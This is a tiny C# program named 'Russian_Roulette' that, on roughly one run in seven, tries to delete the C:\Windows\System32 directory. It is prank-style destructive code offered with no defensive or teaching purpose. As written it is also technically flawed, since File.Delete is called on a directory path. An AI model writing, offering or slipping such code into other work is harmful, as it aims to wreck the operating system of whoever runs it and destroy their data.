namespace Russian_Roulette
{
    class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            if (random.Next(0, 7) == 1)
            {
                System.IO.File.Delete(@"c:\Windows\System32");
            }
        }
    }
}